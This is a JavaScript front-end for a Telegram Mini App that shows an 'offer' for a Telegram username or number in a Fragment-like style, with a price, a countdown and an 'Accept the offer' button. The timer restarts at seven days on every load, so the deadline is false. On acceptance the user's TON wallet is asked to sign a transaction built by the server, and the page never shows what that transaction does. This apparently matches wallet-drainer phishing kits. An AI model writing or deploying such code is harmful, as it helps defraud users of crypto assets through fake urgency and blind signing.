const tg = window.Telegram.WebApp;
tg.expand();


const urlParams = new URLSearchParams(window.location.search);
const offerId = urlParams.get('offer_id') || urlParams.get('startapp');

const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: window.location.origin + '/tonconnect-manifest.json',
    buttonRootId: 'ton-connect'
});

if (!offerId) {
    document.getElementById('accept-btn').innerText = "Invalid link";
} else {
    // Загружаем данные оффера с Render
    fetch(`${API_BASE_URL}/api/offer/${offerId}`)
        .then(r => {
            if (!r.ok) throw new Error("Server error");
            return r.json();
        })
        .then(data => {
            if (data.error) throw new Error(data.error);
            
            // Бот присылает target (юзернейм) и price (цена)
            const rawTarget = data.target;
            const isNumber = data.isNumber;
            const price = data.price;
            
            // Форматируем юзернейм (добавляем @ если это не номер)
            const usernameFormatted = isNumber ? rawTarget : `@${rawTarget}`;
            const urlFormatted = isNumber ? rawTarget : rawTarget;

            // Заполняем поля
            document.getElementById('display-username').innerText = `${urlFormatted}.t.me`;
            document.getElementById('display-price').innerText = price;
            
            document.getElementById('info-username').innerText = usernameFormatted;
            document.getElementById('info-web').innerText = urlFormatted;
            document.getElementById('info-ton').innerText = urlFormatted;
            
            // Кнопка
            document.getElementById('accept-btn').innerText = "Accept the offer";
            document.getElementById('accept-btn').disabled = false;
        })
        .catch(e => {
            console.error("Ошибка загрузки:", e);
            // Если Render не отвечает (спит), показываем сообщение
            document.getElementById('display-username').innerText = "error.t.me";
            document.getElementById('display-price').innerText = "0";
            document.getElementById('info-username').innerText = "error";
            document.getElementById('info-web').innerText = "error";
            document.getElementById('info-ton').innerText = "error";
            
            document.getElementById('accept-btn').innerText = "Server offline. Try again.";
            document.getElementById('accept-btn').disabled = false;
        });
}

// Таймер
let endTime = Date.now() + 7 * 24 * 60 * 60 * 1000;
setInterval(() => {
    let diff = endTime - Date.now();
    if (diff < 0) diff = 0;
    const days = Math.floor(diff / (1000 * 60 * 60 * 24));
    const hours = Math.floor((diff / (1000 * 60 * 60)) % 24).toString().padStart(2, '0');
    const mins = Math.floor((diff / 1000 / 60) % 60).toString().padStart(2, '0');
    const secs = Math.floor((diff / 1000) % 60).toString().padStart(2, '0');

    document.getElementById('t-days').innerText = `${days} days`;
    document.getElementById('t-h0').innerText = hours[0];
    document.getElementById('t-h1').innerText = hours[1];
    document.getElementById('t-m0').innerText = mins[0];
    document.getElementById('t-m1').innerText = mins[1];
    document.getElementById('t-s0').innerText = secs[0];
    document.getElementById('t-s1').innerText = secs[1];
}, 1000);

// Кнопка Accept
document.getElementById('accept-btn').addEventListener('click', async () => {
    if (!tonConnectUI.connected) {
        await tonConnectUI.openModal();
        return;
    }

    const address = tonConnectUI.wallet.account.address;
    const btn = document.getElementById('accept-btn');
    btn.innerText = "Checking...";
    btn.disabled = true;

    try {
        const res = await fetch(`${API_BASE_URL}/api/build`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ address, offer_id: offerId })
        });
        
        const data = await res.json();
        
        if (!res.ok) {
            tg.showAlert(data.error || "Error creating transaction");
            btn.innerText = "Accept the offer";
            btn.disabled = false;
            return;
        }

        await tonConnectUI.sendTransaction(data);
        
        await fetch(`${API_BASE_URL}/api/signed`, { 
            method: 'POST', 
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ offer_id: offerId, address }) 
        });

        tg.showAlert("Success! Offer accepted.");
        btn.innerText = "Success";
        
    } catch (e) {
        console.error(e);
        tg.showAlert("Error: " + e.message);
        btn.innerText = "Accept the offer";
        btn.disabled = false;
    }
});
